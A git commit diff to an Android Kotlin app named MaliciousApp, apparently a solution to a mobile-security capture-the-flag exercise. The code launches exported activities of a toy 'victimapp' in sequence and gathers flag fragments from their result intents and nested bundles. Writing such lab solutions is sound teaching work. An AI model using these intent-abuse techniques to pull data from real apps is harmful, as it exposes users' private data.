c7330a0c9b200c505af87487087b0c6f85b0e471
Alberto Lazari <alberto.lazari@gmail.com>
2023-10-23 17:21:37 +0200

    Put everything in MainActivity

--- 02-justask/MaliciousApp/app/src/main/java/com/example/maliciousapp/MainActivity.kt
+++ 02-justask/MaliciousApp/app/src/main/java/com/example/maliciousapp/MainActivity.kt
@@ -11,11 +11,87 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
+    val TAG = "MOBIOTSEC"
+    val contract = ActivityResultContracts.StartActivityForResult()
+
+    var partialFlag: String = "[null]"
+
+    val partOne = registerForActivityResult(contract) { result ->
+        val flagPart = result
+            .data
+            ?.getStringExtra("flag")
+            ?: "[null]"
+
+        Log.d(TAG, "Part 1: $flagPart")
+        partialFlag = flagPart
+        partTwo.launch(Intent("com.example.victimapp.intent.action.JUSTASK"))
+    }
+    val partTwo = registerForActivityResult(contract) { result ->
+        val flagPart = result
+            .data
+            ?.getStringExtra("flag")
+            ?: "[null]"
+
+        Log.d("MOBIOTSEC", "Part 2: $flagPart")
+        partialFlag += flagPart
+
+        val intent = Intent().apply {
+            component = ComponentName(
+                "com.example.victimapp",
+                "com.example.victimapp.PartThree"
+            )
+        }
+        partThree.launch(intent)
+    }
+    val partThree = registerForActivityResult(contract) { result ->
+        val flagPart = result
+            .data
+            ?.getStringExtra("hiddenFlag")
+            ?: "[null]"
+
+        Log.d("MOBIOTSEC", "Part 3: $flagPart")
+        partialFlag += flagPart
+
+        partFour.launch(Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE"))
+    }
+    val partFour = registerForActivityResult(contract) { result ->
+        result
+            .data
+            ?.getExtras()
+            ?.let { extras ->
+                val flagPart = unwrapBundle(extras)
+                Log.d("MOBIOTSEC", "Part 4: $flagPart")
+
+                val view = findViewById<TextView>(R.id.debug_text)
+                val flag = partialFlag + flagPart
+                view.text = flag
+                Log.d("MOBIOTSEC", "The flag is $flag")
+            }
+    }
+
+    fun unwrapBundle(bundle: Bundle): String {
+        // Get the first key (assume only one key in the bundle)
+        val key = bundle
+            .keySet()
+            .iterator()
+            .next()
+
+        bundle.getBundle(key)?.let {
+            return unwrapBundle(it)
+        }
+        return bundle.getString(key) ?: "[null]"
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // Start chain
-        startActivity(Intent(this, PartOne::class.java))
+        val intent = Intent().apply {
+            component = ComponentName(
+                "com.example.victimapp",
+                "com.example.victimapp.PartOne"
+            )
+        }
+        partOne.launch(intent)
     }
 }
